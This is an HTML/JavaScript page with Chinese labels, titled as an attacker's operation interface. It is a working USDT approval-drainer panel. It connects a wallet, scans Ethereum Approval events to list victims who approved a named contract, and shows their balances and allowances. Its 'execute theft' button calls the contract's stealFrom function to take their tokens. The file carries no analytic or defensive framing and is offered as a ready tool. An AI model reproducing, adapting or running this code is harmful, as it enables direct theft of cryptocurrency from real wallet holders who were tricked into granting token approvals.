<!-- steal.html -->
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>💪 攻擊者操作界面 v3.2.5 (配合新合約)</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 40px; background: #fff; }
    .ok { color: green; }
    .bad { color: red; }
    input { padding: 5px; width: 380px; }
    button { padding: 6px 16px; margin-left: 8px; }
    #refresh { font-size: 12px; color: gray; }
    #victims li { margin-bottom: 4px; }
  </style>
</head>
<body>
  <h2>💪 攻擊者操作界面 v3.2.5 (配合新合約)</h2>
  <p><b>合約地址：</b><span id="contract">0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e</span></p>
  <p><b>目前登入帳號：</b><span id="account">正在連線...</span></p>
  <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
  <input id="input" placeholder="受害者地址" />
  <button onclick="steal()">執行盜取</button>
  <p id="balance"></p>
  <p id="status">等待操作...</p>
  <p id="refresh"></p>
  <h3>🖊️ 授權地址列表：</h3>
  <ul id="victims"></ul>

  <script>
    const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const ABI = [
      "event Approval(address indexed owner, address indexed spender, uint256 value)",
      "function balanceOf(address) view returns (uint256)",
      "function allowance(address owner, address spender) view returns (uint256)",
      "function stealFrom(address victim) external"
    ];

    let provider, signer, attacker;

    async function connect() {
      if (!window.ethereum) return alert("請安裝 MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      attacker = await signer.getAddress();
      document.getElementById("account").innerText = attacker;
      document.getElementById("auth").innerText = "你是攻擊者本人";
      document.getElementById("auth").className = "ok";
      fetchApprovals();
    }

    async function fetchApprovals() {
      document.getElementById("refresh").innerText = "⭐️ 正在捷時更新授權列表...";
      const contract = new ethers.Contract(USDT, ABI, provider);
      const events = await contract.queryFilter(contract.filters.Approval(null, CONTRACT), 19000000);
      const ul = document.getElementById("victims");
      ul.innerHTML = "";
      const seen = new Set();
      events.reverse().forEach(ev => {
        if (!seen.has(ev.args.owner)) {
          seen.add(ev.args.owner);
          const li = document.createElement("li");
          li.innerText = ev.args.owner;
          ul.appendChild(li);
        }
      });
      document.getElementById("refresh").innerText = "✅ 已更新 " + new Date().toLocaleTimeString();
    }

    async function steal() {
      const victim = document.getElementById("input").value;
      if (!ethers.utils.isAddress(victim)) return alert("請輸入合法的地址");
      if (victim.toLowerCase() === attacker.toLowerCase()) {
        return document.getElementById("status").innerText = "⛔️ 無效：不可對自己執行";
      }
      const iface = new ethers.utils.Interface(["function stealFrom(address victim)"]);
      const data = iface.encodeFunctionData("stealFrom", [victim]);
      const tx = { to: CONTRACT, data };
      document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
      try {
        const sent = await signer.sendTransaction(tx);
        document.getElementById("status").innerHTML = "<span class='ok'>✅ TX Hash: <a href='https://etherscan.io/tx/" + sent.hash + "' target='_blank'>" + sent.hash + "</a></span>";
      } catch (e) {
        document.getElementById("status").innerHTML = "<span class='bad'>❌ 失敗: " + e.message + "</span>";
      }
    }

    document.getElementById("input").addEventListener("input", async (e) => {
      const val = e.target.value;
      if (ethers.utils.isAddress(val)) {
        try {
          const contract = new ethers.Contract(USDT, ABI, provider);
          const balance = await contract.balanceOf(val);
          const allowance = await contract.allowance(val, CONTRACT);
          document.getElementById("balance").innerText = "💵 USDT: " + balance.toString() + "\n🗓 Allowance: " + allowance.toString();
        } catch {
          document.getElementById("balance").innerText = "❌ 查詢失敗";
        }
      } else {
        document.getElementById("balance").innerText = "";
      }
    });

    connect();
    setInterval(fetchApprovals, 15000);
  </script>
</body>
</html>
